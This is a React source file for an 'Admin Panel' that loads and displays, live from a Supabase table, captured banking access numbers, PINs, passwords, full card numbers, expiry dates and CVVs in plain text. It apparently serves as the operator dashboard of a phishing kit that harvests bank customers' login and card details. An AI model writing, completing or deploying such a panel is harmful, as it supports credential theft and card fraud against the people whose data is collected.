import React, { useState, useEffect } from 'react';
import { supabase } from '../firebase';

export default function AdminPage({ onBack }) {
  const [data, setData] = useState([]);

  const load = async () => {
    const { data: rows, error } = await supabase
      .from('complete_user_data')
      .select('*')
      .order('completedAt', { ascending: false });
    if (!error) setData(rows);
  };

  useEffect(() => {
    load();

    const channel = supabase
      .channel('admin_realtime')
      .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'complete_user_data' }, load)
      .subscribe();

    return () => supabase.removeChannel(channel);
  }, []);

  return (
    <div className="min-h-screen bg-gray-50 p-6">
      <div className="max-w-7xl mx-auto">
        <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
          <div className="flex justify-between items-center">
            <div>
              <h1 className="text-3xl font-bold text-gray-900 mb-1">Admin Panel</h1>
              <p className="text-gray-500">Total entries: {data.length}</p>
            </div>
            {onBack && (
              <button onClick={onBack} className="bg-gray-600 text-white px-4 py-2 rounded hover:bg-gray-700">
                Back to Login
              </button>
            )}
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-sm p-6">
          {data.length === 0 ? (
            <p className="text-gray-500">No data yet</p>
          ) : (
            <div className="space-y-4">
              {data.map((item) => (
                <div key={item.id} className="border rounded-lg p-4 bg-gray-50 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  <div><strong>Access Number</strong><br /><span className="font-mono">{item.accessNumber}</span></div>
                  <div><strong>PIN</strong><br /><span className="font-mono">{item.pin}</span></div>
                  <div><strong>User Number</strong><br /><span>{item.userNumber}</span></div>
                  <div><strong>Password</strong><br /><span className="font-mono">{item.password}</span></div>
                  <div><strong>Card Number</strong><br /><span className="font-mono">{item.cardNumber}</span></div>
                  <div><strong>Expiry Date</strong><br /><span className="font-mono">{item.expiryDate}</span></div>
                  <div><strong>CVV</strong><br /><span className="font-mono">{item.cvv}</span></div>
                  <div><strong>Completed At</strong><br /><span className="text-sm">{new Date(item.completedAt).toLocaleString()}</span></div>
                  <div><strong>Status</strong><br /><span className="text-green-600 font-semibold">{item.status}</span></div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
